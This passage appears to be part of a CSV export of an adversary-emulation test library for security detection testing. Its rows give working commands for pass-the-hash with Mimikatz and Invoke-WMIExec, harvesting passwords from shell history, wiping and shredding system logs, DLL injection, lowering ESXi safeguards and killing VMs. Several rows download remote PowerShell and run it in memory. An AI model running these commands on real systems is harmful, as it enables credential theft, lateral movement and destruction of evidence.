input_arguments.plist.default: PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist

"
T1550.002,Use Alternate Authentication Material: Pass the Hash,Mimikatz Pass the Hash,ec23cef9-27d9-46e4-a68d-6f75f7b86908,"Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
",windows,,,"#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}""
",command_prompt,,,,powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.user_name.description: username

input_arguments.user_name.type: string

input_arguments.user_name.default: Administrator

input_arguments.ntlm.description: ntlm hash

input_arguments.ntlm.type: string

input_arguments.ntlm.default: cc36cf7a8514893efccd3324464tkg1a

input_arguments.domain.description: domain

input_arguments.domain.type: string

input_arguments.domain.default: %userdnsdomain%

input_arguments.mimikatz_path.description: mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: %tmp%\mimikatz\x64\mimikatz.exe

"
T1550.002,Use Alternate Authentication Material: Pass the Hash,crackmapexec Pass the Hash,eb05b028-16c8-4ad8-adea-6f5b219da9a9,"command execute with crackmapexec
",windows,,,"#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
",command_prompt,,,,powershell,"dependencies.0.description: CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})

dependencies.0.prereq_command: if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}

","input_arguments.user_name.description: username

input_arguments.user_name.type: string

input_arguments.user_name.default: Administrator

input_arguments.crackmapexec_exe.description: crackmapexec windows executable

input_arguments.crackmapexec_exe.type: path

input_arguments.crackmapexec_exe.default: C:\CrackMapExecWin\crackmapexec.exe

input_arguments.command.description: command to execute

input_arguments.command.type: string

input_arguments.command.default: whoami

input_arguments.ntlm.description: command

input_arguments.ntlm.type: string

input_arguments.ntlm.default: cc36cf7a8514893efccd3324464tkg1a

input_arguments.domain.description: domain

input_arguments.domain.type: string

input_arguments.domain.default: %userdnsdomain%

"
T1550.002,Use Alternate Authentication Material: Pass the Hash,Invoke-WMIExec Pass the Hash,f8757545-b00a-4e4e-8cfb-8cfb961ee713,"Use Invoke-WMIExec to Pass the Hash
Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",powershell,,,,,,"input_arguments.ntlm.description: ntlm hash

input_arguments.ntlm.type: string

input_arguments.ntlm.default: cc36cf7a8514893efccd3324464tkg1a

input_arguments.user_name.description: username

input_arguments.user_name.type: string

input_arguments.user_name.default: Administrator

input_arguments.command.description: Command to run on target system

input_arguments.command.type: string

input_arguments.command.default: hostname

input_arguments.target.description: System to run command on

input_arguments.target.type: string

input_arguments.target.default: $env:COMPUTERNAME

"
T1529,System Shutdown/Reboot,Shutdown System - Windows,ad254fa8-45c0-403b-8c77-e00b3d3e7a64,"This test shuts down a Windows system.
",windows,,,"shutdown /s /t #{timeout}
",command_prompt,True,,,,,"input_arguments.timeout.description: Timeout period before shutdown (seconds)

input_arguments.timeout.type: integer

input_arguments.timeout.default: 1

"
T1529,System Shutdown/Reboot,Restart System - Windows,f4648f0d-bf78-483c-bafc-3ec99cd1c302,"This test restarts a Windows system.
",windows,,,"shutdown /r /t #{timeout}
",command_prompt,True,,,,,"input_arguments.timeout.description: Timeout period before restart (seconds)

input_arguments.timeout.type: integer

input_arguments.timeout.default: 1

"
T1529,System Shutdown/Reboot,Restart System via `shutdown` - FreeBSD/macOS/Linux,6326dbc4-444b-4c04-88f4-27e94d0327cb,"This test restarts a FreeBSD/macOS/Linux system.
",linux,macos,,"shutdown -r #{timeout}
",sh,True,,,,,"input_arguments.timeout.description: Time to restart (can be minutes or specific time)

input_arguments.timeout.type: string

input_arguments.timeout.default: now

"
T1529,System Shutdown/Reboot,Shutdown System via `shutdown` - FreeBSD/macOS/Linux,4963a81e-a3ad-4f02-adda-812343b351de,"This test shuts down a FreeBSD/macOS/Linux system using a halt.
",linux,macos,,"shutdown -h #{timeout}
",sh,True,,,,,"input_arguments.timeout.description: Time to shutdown (can be minutes or specific time)

input_arguments.timeout.type: string

input_arguments.timeout.default: now

"
T1529,System Shutdown/Reboot,Restart System via `reboot` - FreeBSD/macOS/Linux,47d0b042-a918-40ab-8cf9-150ffe919027,"This test restarts a FreeBSD/macOS/Linux system via `reboot`.
",linux,macos,,"reboot
",sh,True,,,,,
T1529,System Shutdown/Reboot,Shutdown System via `halt` - FreeBSD/Linux,918f70ab-e1ef-49ff-bc57-b27021df84dd,"This test shuts down a FreeBSD/Linux system using `halt`.
",linux,,,"halt -p
",sh,True,,,,,
T1529,System Shutdown/Reboot,Reboot System via `halt` - FreeBSD,7b1cee42-320f-4890-b056-d65c8b884ba5,"This test restarts a FreeBSD system using `halt`.
",linux,,,"halt -r
",sh,True,,,,,
T1529,System Shutdown/Reboot,Reboot System via `halt` - Linux,78f92e14-f1e9-4446-b3e9-f1b921f2459e,"This test restarts a Linux system using `halt`.
",linux,,,"halt --reboot
",bash,True,,,,,
T1529,System Shutdown/Reboot,Shutdown System via `poweroff` - FreeBSD/Linux,73a90cd2-48a2-4ac5-8594-2af35fa909fa,"This test shuts down a FreeBSD/Linux system using `poweroff`.
",linux,,,"poweroff
",sh,True,,,,,
T1529,System Shutdown/Reboot,Reboot System via `poweroff` - FreeBSD,5a282e50-86ff-438d-8cef-8ae01c9e62e1,"This test restarts a FreeBSD system using `poweroff`.
",linux,,,"poweroff -r 3
",sh,True,,,,,
T1529,System Shutdown/Reboot,Reboot System via `poweroff` - Linux,61303105-ff60-427b-999e-efb90b314e41,"This test restarts a Linux system using `poweroff`.
",linux,,,"poweroff --reboot
",bash,True,,,,,
T1529,System Shutdown/Reboot,Logoff System - Windows,3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4,"This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)
",windows,,,"shutdown /l 
",command_prompt,True,,,,,
T1529,System Shutdown/Reboot,ESXi - Terminates VMs using pkill,987c9b4d-a637-42db-b1cb-e9e242c3991b,"In VMWARE ESXi, process names starting with vmx are associated with running VMs. An adversary can use the pkill command to kill all processes with a prefix vmx.
[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,False,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.cli_script.description: Path to text with commands

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1529\src\esx_pkill.txt

"
T1529,System Shutdown/Reboot,ESXi - Avoslocker enumerates VMs and forcefully kills VMs,189f7d6e-9442-4160-9bc3-5e4104d93ece,"Avoslocker malware has inbuilt functionality to enumerate the VM instances and uses the esxcli command to forcefully power off them.
[Reference](https://blogs.vmware.com/security/2022/02/avoslocker-modern-linux-ransomware-threats.html)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,False,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.cli_script.description: Path to text with commands

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1529\src\esx_avoslocker_kill_vm.txt

"
T1552.003,Unsecured Credentials: Bash History,Search Through Bash History,3cfde62b-7c33-4b26-a61e-755d6131c8ce,"Search through bash history for specifice commands we want to capture
",linux,macos,,"cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}
",sh,,,,,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: ~/loot.txt

input_arguments.bash_history_grep_args.description: grep arguments that filter out specific commands we want to capture

input_arguments.bash_history_grep_args.type: path

input_arguments.bash_history_grep_args.default: -e '-p ' -e 'pass' -e 'ssh'

input_arguments.bash_history_filename.description: Path of the bash history file to capture

input_arguments.bash_history_filename.type: path

input_arguments.bash_history_filename.default: ~/.bash_history

"
T1552.003,Unsecured Credentials: Bash History,Search Through sh History,d87d3b94-05b4-40f2-a80f-99864ffa6803,"Search through sh history for specifice commands we want to capture
",linux,,,"cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
",sh,,,,,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: ~/loot.txt

input_arguments.sh_history_grep_args.description: grep arguments that filter out specific commands we want to capture

input_arguments.sh_history_grep_args.type: path

input_arguments.sh_history_grep_args.default: -e '-p ' -e 'pass' -e 'ssh'

input_arguments.sh_history_filename.description: Path of the sh history file to capture

input_arguments.sh_history_filename.type: path

input_arguments.sh_history_filename.default: ~/.history

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",rm -rf,989cc1b1-3642-4260-a809-54f9dd559683,"Delete system and audit logs
",macos,linux,,"sudo rm -rf #{syslog_path}
if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi && stat #{syslog_path}

dependencies.0.get_prereq_command: touch #{syslog_path}
if [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi

","input_arguments.syslog_path.description: path of syslog file to delete. On macos it's /var/log/system.log*, on linux, it's /var/log/syslog*. Also note for File events, that on macos, /var/ is a link to /private/var/.

input_arguments.syslog_path.type: string

input_arguments.syslog_path.default: /var/log/system.log

input_arguments.macos_audit_path.description: path of audit file to delete

input_arguments.macos_audit_path.type: string

input_arguments.macos_audit_path.default: /var/audit/20220725213300.202208110700021

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",rm -rf,bd8ccc45-d632-481e-b7cf-c467627d68f9,"Delete messages and security logs
",linux,,,"rm -rf /var/log/messages
rm -rf /var/log/security
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files using built-in log utility,653d39cd-bae7-499a-898c-9fb96b8b5cd1,"This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content
",macos,,,"sudo log erase --all
sudo log erase --ttl #Deletes only time-to-live log content
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Truncate system log files via truncate utility,6290f8a8-8ee9-4661-b9cf-390031bf6973,"This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content
",macos,,,"sudo truncate -s 0 #{system_log_path} #size parameter shorthand
sudo truncate --size=0 #{system_log_path} #size parameter 
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path of system log to delete.

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Truncate system log files via truncate utility (freebsd),14033063-ee04-4eaf-8f5d-ba07ca7a097c,"This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content
",linux,,,"truncate -s 0 /var/log/messages #size parameter shorthand
truncate --size=0 /var/log/security #size parameter 
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files via cat utility by appending /dev/null or /dev/zero,c23bdb88-928d-493e-b46d-df2906a50941,"The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility
",macos,,,"sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes
sudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path of system log to delete.

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd),369878c6-fb04-48d6-8fc2-da9d97b3e054,"The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility
",linux,,,"cat /dev/null > /var/log/messages #truncating the file to zero bytes
cat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",System log file deletion via find utility,bc8eeb4a-cc3e-45ec-aa6e-41e973da2558,"This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)
",macos,,,"sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \; #using ""rm"" execution
sudo find /var/log/ -name ""#{system_log_name2}.*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution
sudo find /var/log/ -name ""#{system_log_name3}.*"" -exec unlink {} \; #using ""unlink"" execution
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}

dependencies.0.get_prereq_command: touch /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}

","input_arguments.system_log_name1.description: name or prefix of system log to delete.

input_arguments.system_log_name1.type: string

input_arguments.system_log_name1.default: system.log

input_arguments.system_log_name2.description: name or prefix of system log to delete.

input_arguments.system_log_name2.type: string

input_arguments.system_log_name2.default: system.log.97.gz

input_arguments.system_log_name3.description: name or prefix of system log to delete.

input_arguments.system_log_name3.type: string

input_arguments.system_log_name3.default: system.log.98.gz

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Overwrite macOS system log via echo utility,0208ea60-98f1-4e8c-8052-930dce8f742c,"This test overwrites the contents of system log file with an empty string using echo utility
",macos,,,"sudo echo '' > #{system_log_path}
",sh,True,,,,,"input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Overwrite FreeBSD system log via echo utility,11cb8ee1-97fb-4960-8587-69b8388ee9d9,"This test overwrites the contents of system log file with an empty string using echo utility
",linux,,,"echo '' > /var/log/messages
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Real-time system log clearance/deletion,848e43b3-4c0a-4e4c-b4c9-d1e8cea9651c,"This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process
",macos,,,"sudo log -f /var/log/system.log | : > /var/log/system.log
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files via unlink utility,03013b4b-01db-437d-909b-1fdaa5010ee8,"This test deletes the system log file using unlink utility
",macos,,,"sudo unlink #{system_log_path}
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files via unlink utility (freebsd),45ad4abd-19bd-4c5f-a687-41f3eee8d8c2,"This test deletes the messages log file using unlink utility
",linux,,,"unlink /var/log/messages
",sh,True,,,,,
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files using shred utility,86f0e4d5-3ca7-45fb-829d-4eda32b232bb,"This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely
",macos,,,"sudo shred -u -z -n 3 #{system_log_path}
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files using srm utility,b0768a5e-0f32-4e75-ae5b-d036edcf96b6,"This test securely deletes the system log files individually and recursively using the srm utility.
Install srm using Homebrew with the command: brew install khell/homebrew-srm/srm
Refer: https://github.com/khell/homebrew-srm/issues/1 for installation
",macos,,,"sudo srm #{system_log_path} #system log file deletion
sudo srm -r #{system_log_folder} #recursive deletion of log files
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path} #{system_log_folder}

dependencies.0.get_prereq_command: mkdir -p #{system_log_folder} && touch #{system_log_path} #{system_log_folder}/system.log

","input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

input_arguments.system_log_folder.description: path to log parent folder

input_arguments.system_log_folder.type: string

input_arguments.system_log_folder.default: /var/log/

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files using OSAScript,810a465f-cd4f-47bc-b43e-d2de3b033ecc,"This test deletes the system log file using osascript via ""do shell script""(sh/bash by default) which in-turn spawns rm utility, requires admin privileges
",macos,,,"osascript -e 'do shell script ""rm #{system_log_path}"" with administrator privileges'
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files using Applescript,e62f8694-cbc7-468f-862c-b10cd07e1757,"This test deletes the system log file using applescript using osascript via Finder application
Note: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.
Refer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive
",macos,,,"osascript -e 'tell application ""Finder"" to delete POSIX file ""#{system_log_path}""'
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{system_log_path}

dependencies.0.get_prereq_command: touch #{system_log_path}

","input_arguments.system_log_path.description: path to system.log

input_arguments.system_log_path.type: string

input_arguments.system_log_path.default: /var/log/system.log

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system journal logs via rm and journalctl utilities,ca50dd85-81ff-48ca-92e1-61f119cb1dcf,"The first sub-test deletes the journal files using rm utility in the ""/var/log/journal/"" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.
",linux,,,"sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content
sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place
",sh,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat #{journal_folder}

dependencies.0.get_prereq_command: mkdir -p #{journal_folder} && touch #{journal_folder}/T1070_002.journal

","input_arguments.journal_folder.description: path to journal logs

input_arguments.journal_folder.type: string

input_arguments.journal_folder.default: /var/log/journal

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Overwrite Linux Mail Spool,1602ff76-ed7f-4c94-b550-2f727b4782d4,"This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.
",linux,,,"echo 0> /var/spool/mail/#{username}
",bash,True,,,sh,"dependencies.0.description: target files must exist

dependencies.0.prereq_command: stat /var/spool/mail/#{username}

dependencies.0.get_prereq_command: touch /var/spool/mail/#{username}

","input_arguments.username.description: Username of mail spool

input_arguments.username.type: string

input_arguments.username.default: root

"
T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Overwrite Linux Log,d304b2dc-90b4-4465-a650-16ddd503f7b5,"This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.
",linux,,,"echo 0> #{log_path}
",bash,True,,"if [ ""/var/log/secure"" != ""#{log_path}"" ] ; then rm -f #{log_path} ; fi
",,,"input_arguments.log_path.description: Path of specified log

input_arguments.log_path.type: path

input_arguments.log_path.default: /var/log/secure

"
T1055.001,Process Injection: Dynamic-link Library Injection,Process Injection via mavinject.exe,74496461-11a1-4982-b439-4d87a550d254,"Windows 10 Utility To Inject DLLS.

Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
",windows,,,"$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING ""#{dll_payload}""
Stop-Process -processname notepad
",powershell,True,,,powershell,"dependencies.0.description: Utility to inject must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"" -OutFile ""#{dll_payload}""

","input_arguments.process_id.description: PID of input_arguments

input_arguments.process_id.type: string

input_arguments.process_id.default: (Start-Process notepad -PassThru).id

input_arguments.dll_payload.description: DLL to Inject

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll

"
T1055.001,Process Injection: Dynamic-link Library Injection,WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,8b56f787-73d9-4f1d-87e8-d07e89cbc7f5,Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1'),powershell,,,,,,
T1562.010,Impair Defenses: Downgrade Attack,ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI,062f92c9-28b1-4391-a5f8-9d8ca6852091,"An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
",linux,,,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})
Disconnect-VIServer -Confirm:$false
",powershell,True,,,powershell,"dependencies.0.description: Check if VMWARE PowerCLI PowerShell Module is installed.

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
if (-not $RequiredModule) {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name VMware.PowerCLI -Confirm:$false

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

"
T1562.010,Impair Defenses: Downgrade Attack,ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,14d55b96-b2f5-428d-8fed-49dc4d9dd616,"An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.cli_script.description: Path to script with commands to change acceptance level

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1562.010\src\esx_community_supported.txt

"
T1201,Password Policy Discovery,Examine password complexity policy - Ubuntu,085fe567-ac84-47c7-ac4c-2688ce28265b,"Lists the password complexity policy to console on Ubuntu Linux.
",linux,,,"cat /etc/pam.d/common-password
",bash,,,,,,
T1201,Password Policy Discovery,Examine password complexity policy - FreeBSD,a7893624-a3d7-4aed-9676-80498f31820f,"Lists the password complexity policy to console on FreeBSD.
",linux,,,"cat /etc/pam.d/passwd
",sh,,,,,,
T1201,Password Policy Discovery,Examine password complexity policy - CentOS/RHEL 7.x,78a12e65-efff-4617-bc01-88f17d71315d,"Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
",linux,,,"cat /etc/security/pwquality.conf
",bash,,,,,"dependencies.0.description: System must be CentOS or RHEL v7

dependencies.0.prereq_command: if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq ""7"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo Please run from CentOS or RHEL v7

",
T1201,Password Policy Discovery,Examine password complexity policy - CentOS/RHEL 6.x,6ce12552-0adb-4f56-89ff-95ce268f6358,"Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.
",linux,,,"cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf
",bash,,,,,"dependencies.0.description: System must be CentOS or RHEL v6

